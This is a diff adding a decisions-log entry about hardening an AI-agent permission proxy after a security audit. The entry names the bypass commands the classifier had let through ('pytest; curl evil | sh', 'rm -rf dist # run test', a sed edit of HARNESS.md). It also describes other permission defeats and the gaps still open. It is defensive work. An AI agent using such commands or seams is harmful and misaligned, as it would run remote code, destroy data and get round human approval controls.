@@ -11,6 +11,26 @@ It is not a git commit log — it captures *decisions and their rationale*, not 
 
 ---
 
+## 2026-09-02 — ACP reference-proxy hardening: close four permission-seam defeats (audit PR-4)
+
+Fixes four confirmed defects in the ACP governance proxy (`platform/agents/acp/reference-proxy/`,
+reference/adoption code) from the 2026-09-01 audit. **`classify`:** the execute tier is now a FLOOR — a
+command lowers to Tier 1 only when its head is a recognized test/lint/build runner and it has no shell
+metacharacters, so `rm -rf dist # run test` and `pytest; curl evil | sh` stay at the baseline (were
+auto-approvable Tier 1 via `tier = max(matched)`); and the governance-entrypoint escalation is now
+kind-independent (an `execute` whose command targets an entrypoint — `sed -i … HARNESS.md` — is Tier 5,
+via a de-anchored command search). **`load_policy`:** enforces "may tighten, never loosen" IN CODE —
+rejects an override that lowers a kind's tier or lifts an `allow_always` ban (was a YAML comment).
+**`proxy.py`:** the client's permission RESPONSE is now clamped to the option set the proxy actually
+offered (was forwarded verbatim — a client could answer `allow_always` to a request rewritten to
+`reject_once`); the audit sink records each clamp; and a JSON-RPC batch (list) frame no longer crashes the
+pump. Tests: 17 → 23 (regressions for every classifier/loader fix). README documents the hardening + the
+residuals an adopter must still close (self-declared `kind` is trusted; the child is an unsandboxed
+`Popen`; `tier-policy.yaml` is still a mirror not the effective source). **Deferred:** wiring the Python
+tests into CI (a `.github/` change — folded into the CI-hardening pass); and reconciling the YAML schema
+with the engine. Distillation (presentation ≠ enforcement — clamp the return leg; a "never loosen" comment
+is not a constraint until code rejects it) in `shared-observations.md`.
+
 ## 2026-09-02 — Validator hardening: close four scanner bypasses (audit PR-3)
 
 Fixes four confirmed validator defects from the 2026-09-01 audit, none of which the green self-test suite
